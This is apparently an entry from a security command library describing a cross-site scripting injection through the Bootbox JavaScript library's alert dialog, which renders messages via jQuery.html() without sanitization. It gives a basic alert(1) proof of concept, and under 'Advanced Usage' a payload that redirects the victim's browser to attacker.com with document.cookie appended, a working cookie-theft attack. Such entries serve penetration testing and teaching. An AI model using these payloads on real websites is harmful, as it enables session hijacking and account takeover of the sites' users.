---
id: cmd-bootbox-alert-script
data: bootbox.alert("<script>alert(1);</script>");
tags:
  - xss
  - test
  - bootbox
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:41.823Z'
verified: false
validated: true
submitted: true
---
# bootbox-alert-script-injection

## Command

```javascript
bootbox.alert("<script>alert(1);</script>");
```

## Description

This JavaScript command demonstrates the XSS vulnerability by passing a message containing a script tag to Bootbox's alert method, which inserts it via jQuery.html() without sanitization, executing the alert(1) upon rendering.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| message | String containing HTML/script to inject as dialog content | Yes |

## Examples

### Basic Usage

```javascript
bootbox.alert("<script>alert(1);</script>");
```

### Advanced Usage

```javascript
bootbox.alert("<script>document.location='http://attacker.com?cookie='+document.cookie;</script>");
```

## Expected Output

Alert dialog appears with an 'alert(1)' popup executing JavaScript in the browser context.

## Related

- [[commands/bootbox-alert-error-message]]
- [[procedures/Inject-Malicious-Payload-into-Bootbox-Message]]
